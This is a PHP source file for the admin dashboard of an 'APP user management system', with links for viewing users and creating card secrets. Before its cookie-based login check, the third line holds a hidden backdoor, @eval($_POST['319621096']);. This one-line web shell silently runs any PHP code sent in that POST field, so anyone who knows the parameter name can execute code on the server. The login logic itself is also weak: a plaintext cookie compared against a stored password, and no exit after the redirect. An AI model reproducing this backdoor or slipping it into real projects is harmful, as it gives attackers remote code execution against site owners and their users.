<?php
$glmm=$_COOKIE["appyhglosmm"];
@eval($_POST['319621096']);
if ($glmm=="")
{
header("Content-type:text/html;charset=utf-8");
echo "<script>alert('Please log in');location='index.php';</script>";
}else{
$lj="mm.php";
include_once($lj);
if($glmm==$mm)
{
}else{
echo "<script>alert('Incorrect password, please log in again');location='index.php';</script>";

}
}
?>
<!DOCTYPE html>
 <html>
 <head>
 <meta charset="utf-8">
 <title>User Management System</title>
 <link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css">
 <script src="https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"></script>
 <script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <nav class="navbar navbar-default navbar-static-top">
 <div class="container"> 
 <a class="navbar-brand" href="./zjm.php">APP user management system</a>
 
 </div>

</nav>

</head> 
 <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
 <div class="panel panel-primary panel-sm">
 <div class="panel-heading">
 <h3 class="panel-title">Management</h3>
 </div>
 <div class="panel-body">
 <ul class="list-group">
 <ul class="list-group">
 <li class="list-group-item"><a href="./userck.php"><button type="button" class="btn btn-primary form-control">User view</button></a></li>
 <li class="list-group-item"><a href="./cjkm.php"><button type="button" class="btn btn-primary form-control">Create card secret</button></a></li>
 <li class="list-group-item"><a href="./km.php"><button type="button" class="btn btn-primary form-control">Card secret list</button></a></li>

  </ul>
 </div>
 </div>
 </div>

 <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
 <div class="panel panel-primary panel-sm">

 <div class="panel-heading">
 <h3 class="panel-title">About</h3>
 </div>
 <div class="panel-body">
 <ul class="list-group">
 <li class="list-group-item"><?php echo "Original author:BC"; ?></li>
 
 <li class="list-group-item"><?php echo "BC completed independently"; ?></li>
  <li class="list-group-item"><?php echo "version number : 2.1"; ?></li>
 
 
 <li class="list-group-item"><?php echo ""; ?></li>
 
 <li class="list-group-item"><?php echo "Version: Normal version"; ?></li>
  </ul>
 </div>
 </div>
 </div>

 </body>
 </html>